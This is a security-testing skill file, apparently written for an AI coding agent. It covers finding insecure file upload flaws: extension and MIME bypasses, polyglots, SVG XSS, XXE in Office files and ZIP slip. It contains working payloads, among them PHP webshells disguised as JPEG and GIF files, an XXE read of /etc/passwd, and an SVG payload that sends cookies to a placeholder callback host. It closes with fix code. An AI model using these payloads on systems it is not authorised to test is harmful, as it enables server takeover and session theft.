---
name: insecure-file-upload
description: >
  Use when testing file upload endpoints for unrestricted file upload, MIME type bypass,
  magic byte spoofing, polyglot files, SVG XSS, XXE via Office documents, ZIP slip, and
  path traversal in filenames. Trigger on: multipart/form-data endpoints, avatar/document
  upload flows, import-from-file features, profile image, CSV/Excel import, DOCX/XLSX
  parsing, image resizing pipelines, archive extraction, and any endpoint that stores
  or serves user-supplied files. Detects extension bypass (shell.php.jpg), null byte
  injection, double extension, ImageMagick exploits, and content-type confusion.
license: Apache-2.0
compatibility: Designed for Claude Code. Tools: Burp Suite, exiftool.
metadata:
  category: web
  version: "0.1"
  source: https://github.com/BehiSecc/VibeSec-Skill
  source_types: blog_post
---

# Insecure File Upload

## What Is Broken and Why

File upload endpoints that validate file type only by extension or Content-Type header
allow attackers to upload executable files, XSS payloads, XXE-triggering documents, or
path-traversal archives. Depending on where files are stored and served, impact ranges
from stored XSS to full remote code execution.

## Key Signals

- `multipart/form-data` POST endpoints accepting user files
- File extensions accepted beyond images/docs (or poorly validated)
- Server echoes original filename in response or URL
- Files served from same origin as application (not separate CDN/domain)
- Archive extraction features (ZIP, tar)
- Office document processing (DOCX, XLSX, PPTX — all ZIP+XML internally)
- Image processing pipelines (ImageMagick, Pillow, libvips)

## Methodology

1. Upload a valid file; note the URL/path where it's stored and served.
2. Check if files are served from same origin (XSS scope) or separate domain.
3. Attempt extension bypass: `shell.php.jpg`, `shell.php%00.jpg`, `shell.jpg.php`.
4. Modify `Content-Type` to `image/jpeg` while uploading a PHP/JSP file.
5. Prepend valid magic bytes to malicious content; attempt upload.
6. Test SVG upload — inject `<svg onload="...">` for XSS.
7. Test DOCX/XLSX upload with XXE payload inside XML.
8. For archive extraction: craft ZIP with `../` paths (ZIP slip).
9. Check if filename is reflected anywhere — test for path traversal and injection.

## Payloads & Tools

```bash
# SVG XSS
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://CALLBACK/?c='+document.cookie)"/>

# PHP webshell disguised as JPEG (magic bytes prepend)
printf '\xff\xd8\xff\xe0' > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# Null byte bypass (older systems)
filename: shell.php%00.jpg

# XXE in DOCX — inject into word/document.xml inside the archive
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

# ZIP slip
zip --symlinks traversal.zip ../../etc/passwd

# Polyglot GIF+PHP
GIF89a<?php system($_GET['cmd']); ?>
```

**Magic bytes reference:**

| Type | Hex |
|------|-----|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX | `50 4B 03 04` |

## Bypass Techniques

| Attack | Technique |
|--------|-----------|
| Extension bypass | `shell.php.jpg` — server splits on first dot |
| Double extension | `shell.jpg.php` — server uses last extension |
| Null byte | `shell.php%00.jpg` — older parsers truncate at null |
| MIME spoof | `Content-Type: image/jpeg` on PHP file |
| Magic byte prepend | Prefix file with valid JPEG/GIF header bytes |
| Polyglot | File valid as both JPEG and PHP simultaneously |
| SVG with JS | XML-based, browsers execute `onload` from same origin |
| XXE in Office | DOCX/XLSX are ZIP+XML; inject DTD in contained XML |
| ZIP slip | Archive paths containing `../` extract outside intended dir |
| Content-type sniff | Omit Content-Type; let browser sniff — bypass `nosniff`-less servers |

## Exploitation Scenarios

**Stored XSS via SVG:**
Setup → Application accepts SVG avatar uploads, serves them from same origin.
Trigger → Upload SVG with `<svg onload="fetch('https://CALLBACK/?c='+document.cookie)">`.
Impact → Any user viewing the avatar triggers XSS; session tokens exfiltrated.

**RCE via PHP upload:**
Setup → PHP application accepts image uploads, validates only Content-Type header.
Trigger → Upload `shell.php` with `Content-Type: image/jpeg`; access via direct URL.
Impact → Remote command execution on server.

**XXE via XLSX import:**
Setup → Application parses Excel files for data import.
Trigger → Upload crafted XLSX with XXE payload in sheet XML referencing internal files.
Impact → Server-side file read; possible SSRF to internal metadata endpoints.

## False Positives

- Upload endpoints that store files outside webroot and never serve them directly — RCE
  risk is mitigated, but XXE/ZIP slip may still apply.
- Files renamed server-side to random UUIDs — original extension irrelevant for stored XSS
  but magic byte and content validation still matters.

## Fix Patterns

```python
# Validate magic bytes, not just extension
import magic
allowed_mimes = {'image/jpeg', 'image/png', 'image/gif'}
detected = magic.from_buffer(file.read(2048), mime=True)
if detected not in allowed_mimes:
    raise ValueError("Invalid file type")

# Always rename to UUID; never use original filename
import uuid, os
ext_map = {'image/jpeg': '.jpg', 'image/png': '.png'}
safe_name = str(uuid.uuid4()) + ext_map[detected]
```

## Related Skills

XXE payloads embedded in DOCX/XLSX connect directly to [[xxe]]. SVG XSS from same-origin
uploads is [[xss-stored]]. Path traversal in zip extraction is [[path-traversal]].
If the upload URL is fetched server-side, pivot to [[ssrf]].
